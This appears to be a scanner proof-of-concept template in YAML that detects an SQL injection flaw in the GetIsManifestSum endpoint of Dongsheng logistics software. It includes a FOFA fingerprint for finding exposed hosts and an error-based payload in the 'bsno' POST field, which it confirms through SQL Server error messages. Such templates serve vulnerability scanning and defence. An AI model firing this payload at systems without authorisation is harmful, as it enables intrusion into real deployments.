id: poc-yaml-dongshengsoft-getismanifestsum-sqli
info:
  name: 东胜物流软件 GetIsManifestSum SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 东胜物流软件
  fofa: app="东胜物流软件-物流软件"
requests:
- method: POST
  path: /MvcShipping/MsOpSeae/GetIsManifestSum
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: bsno='and+1<@@VERSION--+-
  expression: status_code == 500 && contains(body,"Microsoft SQL Server") && contains(body,"SqlException:")
    && contains(body,".GetIsManifestSum") && matches(body,"转换成数据类型(.*?)时失败") && matches(body,"在将(.*?)值")
variables: {}
transport: http
